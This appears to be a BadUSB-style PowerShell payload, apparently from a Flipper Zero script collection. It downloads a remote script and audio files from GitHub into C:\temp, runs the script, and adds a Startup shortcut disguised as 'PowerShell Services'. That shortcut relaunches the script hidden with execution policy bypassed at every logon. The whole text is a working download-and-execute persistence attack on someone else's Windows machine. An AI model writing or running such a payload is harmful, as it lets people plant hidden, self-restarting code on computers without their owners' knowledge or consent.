$FilePath = "C:\temp\subtle_audio.ps1"

$myDownloadUrl = "https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/subtle_audio/subtle_audio.ps1"
Invoke-WebRequest $myDownloadUrl -OutFile $FilePath

for (($i = 1); ($i -lt 18); ($i++)) {
    Invoke-WebRequest "https://github.com/MattHinz03/Flipper-Scripts/raw/main/subtle_audio/$i.wav" -OutFile "C:\temp\$i.wav"
}


$ShortcutPath = "$([Environment]::GetFolderPath('Startup'))\PowerShell Services.lnk"
$ScriptPath = (Get-Item $FilePath).FullName
$WindowsPowerShell = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $WindowsPowerShell
$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
$Shortcut.IconLocation = $WindowsPowerShell
$Shortcut.WorkingDirectory = (Get-Item $WindowsPowerShell).DirectoryName
$Shortcut.Save()

& "C:/temp/subtle_audio.ps1"